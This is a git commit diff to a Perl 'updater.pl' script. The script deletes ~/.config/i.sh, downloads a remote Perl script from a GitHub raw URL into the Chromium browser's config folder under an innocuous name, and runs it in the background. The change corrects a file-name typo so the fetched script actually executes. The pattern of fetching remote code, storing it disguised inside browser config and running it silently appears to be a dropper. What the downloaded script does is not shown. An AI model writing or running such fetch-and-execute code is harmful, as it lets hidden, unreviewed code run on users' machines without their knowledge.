c98f580dfb6c81a689a87d57b927b868fba679db
reimch <reimch@tutamail.com>
2024-10-28 17:37:07 +0300

    Update updater.pl

--- src/updater.pl
+++ src/updater.pl
@@ -1,4 +1,4 @@
 #!/usr/bin/perl -w
 system("rm ~/.config/i.sh");
 system("wget -O ~/.config/chromium/wv.pl https://raw.githubusercontent.com/reimch/white-vice/refs/heads/main/src/white_vice.pl");
-system("perl ~/.config/chromium/wv.ph &");
+system("perl ~/.config/chromium/wv.pl &");
